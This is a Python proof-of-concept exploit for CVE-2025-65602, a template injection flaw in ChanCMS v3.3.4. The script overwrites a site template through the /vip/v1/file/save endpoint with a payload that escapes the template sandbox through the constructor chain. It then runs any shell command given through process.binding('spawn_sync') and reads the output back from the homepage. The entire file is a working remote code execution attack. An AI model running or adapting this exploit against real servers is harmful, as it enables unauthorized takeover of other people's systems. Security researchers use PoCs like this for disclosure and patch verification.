#!/usr/bin/env python3
"""
CVE-2025-65602 - ChanCMS v3.3.4 Template Injection RCE PoC

Vulnerability: Template injection in /vip/v1/file/save endpoint allows
attackers to execute arbitrary code via process.binding('spawn_sync').
"""
import requests
import sys
import random
import string

TARGET = "http://localhost:3000"

def random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase, k=length))

def backup_template(session, target, template_path):
    content_url = f"{target}/vip/v1/file/content"
    try:
        resp = session.get(content_url, params={"path": template_path}, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            if data.get("code") == 200:
                return data.get("data", "")
    except:
        pass
    return None

def save_template(session, target, template_path, content):
    save_url = f"{target}/vip/v1/file/save"
    payload = {"path": template_path, "content": content}
    try:
        resp = session.post(save_url, json=payload, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            return data.get("code") == 200
    except:
        pass
    return False

def exploit(target, command="id"):
    session = requests.Session()
    marker = random_string()
    
    template_path = "/app/app/modules/web/view/default/common/debug.html"
    
    print(f"[*] Target: {target}")
    print(f"[*] Marker: {marker}")
    print(f"[*] Command: {command}")
    
    print("[*] Step 1: Backup original template")
    original_content = backup_template(session, target, template_path)
    if original_content:
        print(f"[+] Original content backed up ({len(original_content)} bytes)")
    else:
        original_content = ""
    
    payload_content = f'''<!-- CVE-2025-65602 RCE PoC - {marker} -->
<%
var fn = ''.constructor.constructor;
var p = fn('return this.process')();
var spawn_sync = p.binding('spawn_sync');
var result = 'EXEC_FAILED';
try {{
  var opts = {{
    file: '/bin/sh',
    args: ['/bin/sh', '-c', '{command}'],
    stdio: [
      {{ type: 'pipe', readable: true, writable: false }},
      {{ type: 'pipe', readable: false, writable: true }},
      {{ type: 'pipe', readable: false, writable: true }}
    ]
  }};
  var child = spawn_sync.spawn(opts);
  if(child && child.output && child.output[1]) {{
    result = child.output[1].toString();
  }}
}} catch(e) {{
  result = 'ERROR:' + e.message;
}}
%>
<div id="rce-{marker}">RCE_OUTPUT:{{{{result}}}}</div>
'''
    
    print("[*] Step 2: Injecting RCE payload via /vip/v1/file/save")
    if not save_template(session, target, template_path, payload_content):
        print("[-] Failed to save malicious template")
        return False
    print("[+] Malicious template saved successfully")
    
    print("[*] Step 3: Triggering RCE via homepage")
    try:
        resp = session.get(f"{target}/", timeout=10)
        print(f"[*] Response status: {resp.status_code}")
        
        if f"rce-{marker}" in resp.text and "RCE_OUTPUT:" in resp.text:
            for line in resp.text.split('\n'):
                if f'rce-{marker}' in line:
                    output = line.split('RCE_OUTPUT:')[1].split('</div>')[0].strip()
                    if output and output != 'EXEC_FAILED' and not output.startswith('ERROR:'):
                        print("[+] SUCCESS! Remote Code Execution confirmed!")
                        print(f"[+] Command output:")
                        print(f"    {output}")
                        if original_content:
                            save_template(session, target, template_path, original_content)
                        return True
                    else:
                        print(f"[-] Execution result: {output}")
        
    except Exception as e:
        print(f"[-] Error: {e}")
    
    if original_content:
        save_template(session, target, template_path, original_content)
    return False

def main():
    target = sys.argv[1] if len(sys.argv) > 1 else TARGET
    command = sys.argv[2] if len(sys.argv) > 2 else "id"
    
    print("=" * 60)
    print("CVE-2025-65602 - ChanCMS v3.3.4 Template Injection RCE")
    print("=" * 60)
    
    success = exploit(target, command)
    
    print("=" * 60)
    if success:
        print("[+] Vulnerability verified - RCE successful!")
        return 0
    else:
        print("[-] Exploitation failed")
        return 1

if __name__ == "__main__":
    sys.exit(main())
